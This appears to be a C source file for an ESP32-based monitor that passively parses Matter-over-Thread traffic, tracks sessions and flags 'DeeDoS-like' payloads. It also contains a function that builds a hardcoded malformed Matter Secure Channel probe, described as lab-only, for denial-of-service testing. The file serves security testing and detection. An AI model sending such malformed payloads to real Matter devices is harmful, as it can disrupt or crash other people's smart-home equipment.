/**
 * @file matter_monitor.c
 * @brief Passive Matter-over-Thread monitoring and DeeDoS probe generation.
 */

#include "matter_monitor.h"

#include <inttypes.h>
#include <string.h>
#include "esp_log.h"
#include "frame_parser.h"

static const char *TAG = "matter_monitor";

static matter_monitor_stats_t s_stats;
static matter_session_t       s_sessions[MATTER_MONITOR_MAX_SESSIONS];

static bool lowpan_like(const uint8_t *payload, uint8_t len)
{
    if (payload == NULL || len == 0) {
        return false;
    }

    uint8_t dispatch = payload[0];
    return ((dispatch & 0xE0) == 0x60) ||
           ((dispatch & 0xC0) == 0x80) ||
           ((dispatch & 0xF8) == 0xC0) ||
           ((dispatch & 0xF8) == 0xF0);
}

static int find_udp_header(const uint8_t *payload, uint8_t len, uint16_t port)
{
    if (payload == NULL || len < 8) {
        return -1;
    }

    uint8_t msb = (uint8_t)(port >> 8);
    uint8_t lsb = (uint8_t)(port & 0xFF);
    for (uint8_t i = 0; i + 7 < len; i++) {
        if ((payload[i] == msb && payload[i + 1] == lsb) ||
            (payload[i + 2] == msb && payload[i + 3] == lsb)) {
            return i;
        }
    }

    return -1;
}

static matter_session_t *get_session(uint16_t session_id,
                                     uint16_t src_short,
                                     uint16_t dst_short)
{
    matter_session_t *free_slot = NULL;

    for (size_t i = 0; i < MATTER_MONITOR_MAX_SESSIONS; i++) {
        if (!s_sessions[i].active && free_slot == NULL) {
            free_slot = &s_sessions[i];
            continue;
        }

        if (s_sessions[i].active &&
            s_sessions[i].session_id == session_id &&
            s_sessions[i].source_short_addr == src_short &&
            s_sessions[i].dest_short_addr == dst_short) {
            return &s_sessions[i];
        }
    }

    if (free_slot != NULL) {
        memset(free_slot, 0, sizeof(*free_slot));
        free_slot->active = true;
        free_slot->session_id = session_id;
        free_slot->source_short_addr = src_short;
        free_slot->dest_short_addr = dst_short;
        s_stats.active_sessions++;
        return free_slot;
    }

    return NULL;
}

esp_err_t matter_monitor_start(void)
{
    memset(&s_stats, 0, sizeof(s_stats));
    memset(s_sessions, 0, sizeof(s_sessions));
    s_stats.active = true;
    ESP_LOGI(TAG, "Matter monitor started");
    return ESP_OK;
}

esp_err_t matter_monitor_stop(void)
{
    s_stats.active = false;
    ESP_LOGI(TAG, "Matter monitor stopped (%" PRIu32 " Matter packet(s))",
             s_stats.matter_over_thread_packets);
    return ESP_OK;
}

esp_err_t matter_monitor_get_stats(matter_monitor_stats_t *stats)
{
    if (stats == NULL) {
        return ESP_ERR_INVALID_ARG;
    }

    memcpy(stats, &s_stats, sizeof(*stats));
    return ESP_OK;
}

size_t matter_monitor_get_sessions(matter_session_t *sessions, size_t max_sessions)
{
    size_t copied = 0;
    if (sessions == NULL || max_sessions == 0) {
        return 0;
    }

    for (size_t i = 0; i < MATTER_MONITOR_MAX_SESSIONS && copied < max_sessions; i++) {
        if (s_sessions[i].active) {
            sessions[copied++] = s_sessions[i];
        }
    }

    return copied;
}

void matter_monitor_process_packet(const uint8_t *frame,
                                   uint8_t len,
                                   int8_t rssi,
                                   uint8_t channel,
                                   uint32_t timestamp_us)
{
    (void)rssi;

    if (!s_stats.active || frame == NULL || len == 0) {
        return;
    }

    mac_header_t mac;
    if (frame_parse_mac(frame, len, &mac) != ESP_OK || mac.header_len >= len) {
        return;
    }

    const uint8_t *payload = &frame[mac.header_len];
    uint8_t payload_len = len - mac.header_len;
    if (!lowpan_like(payload, payload_len)) {
        return;
    }

    int udp_offset = find_udp_header(payload, payload_len, 0x15A4);
    if (udp_offset < 0 || (udp_offset + 8) >= payload_len) {
        return;
    }

    const uint8_t *matter = &payload[udp_offset + 8];
    uint8_t matter_len = payload_len - (uint8_t)(udp_offset + 8);
    if (matter_len < 8) {
        return;
    }

    uint16_t session_id = (uint16_t)matter[1] | ((uint16_t)matter[2] << 8);
    uint32_t message_counter = (uint32_t)matter[4] |
                               ((uint32_t)matter[5] << 8) |
                               ((uint32_t)matter[6] << 16) |
                               ((uint32_t)matter[7] << 24);
    bool suspicious = (matter_len > 24 && matter[0] == 0x00 && matter[3] == 0x00);

    matter_session_t *session = get_session(session_id, mac.src_short_addr, mac.dst_short_addr);
    if (session == NULL) {
        return;
    }

    session->message_counter = message_counter;
    session->message_count++;
    session->channel = channel;
    session->last_seen_ms = timestamp_us / 1000;
    session->suspicious_deedos_pattern = suspicious;

    s_stats.total_packets++;
    s_stats.matter_over_thread_packets++;
    s_stats.last_channel = channel;
    if (suspicious) {
        s_stats.deedos_candidates++;
        ESP_LOGW(TAG, "Matter DeeDoS-like payload observed sid=0x%04X ch=%u", session_id, channel);
    }
}

esp_err_t matter_monitor_build_deedos_probe(uint8_t *buffer,
                                            size_t buffer_len,
                                            size_t *probe_len)
{
    if (buffer == NULL || probe_len == NULL || buffer_len < MATTER_DEEDOS_PROBE_LEN) {
        return ESP_ERR_INVALID_ARG;
    }

    /* Lab-only malformed Matter Secure Channel payload intended for transport by a caller. */
    static const uint8_t probe[MATTER_DEEDOS_PROBE_LEN] = {
        0x00, 0xFF, 0xFF, 0x00, /* flags + oversized session id sentinel */
        0x01, 0x00, 0x00, 0x00, /* message counter */
        0x15, 0x00, 0x00, 0x00, /* exchange flags/opcode placeholder */
        0xFF, 0xFF, 0xFF, 0xFF, /* intentionally inconsistent lengths */
        0x30, 0x82, 0x7F, 0xFF, /* malformed TLV/container size lead-in */
        0x18, 0x18, 0x18, 0x18,
        0xFF, 0x00, 0xFF, 0x00,
        0xAA, 0x55, 0xAA, 0x55,
    };

    memcpy(buffer, probe, sizeof(probe));
    *probe_len = sizeof(probe);
    return ESP_OK;
}
